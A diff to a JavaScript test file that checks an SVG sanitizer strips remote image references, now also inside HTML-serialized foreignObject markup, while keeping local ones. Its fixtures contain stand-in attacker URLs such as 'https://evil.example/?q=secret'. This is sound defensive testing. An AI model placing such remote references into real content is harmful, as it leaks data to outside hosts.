@@ -19,12 +19,13 @@ test("only URLs on our own origin count as same-origin", () => {
   }
 });
 
-test("remote SVG images are removed, local ones kept", () => {
+test("remote SVG images are removed, local ones kept, also in HTML-serialized SVG", () => {
   const restore = installDom("https://carapace.example.test/");
   try {
     const svg =
       '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://evil.example/?q=secret"/>' +
-      '<image href="/emoji/1f600.svg"/><text>label</text></svg>';
+      '<image href="/emoji/1f600.svg"/><foreignObject><div>line<br>break&nbsp;<img src="https://evil.example/i">' +
+      "</div></foreignObject><text>label</text></svg>";
     const cleaned = stripRemoteSvgImages(svg);
     assert.doesNotMatch(cleaned, /evil\.example/);
     assert.match(cleaned, /\/emoji\/1f600\.svg/);
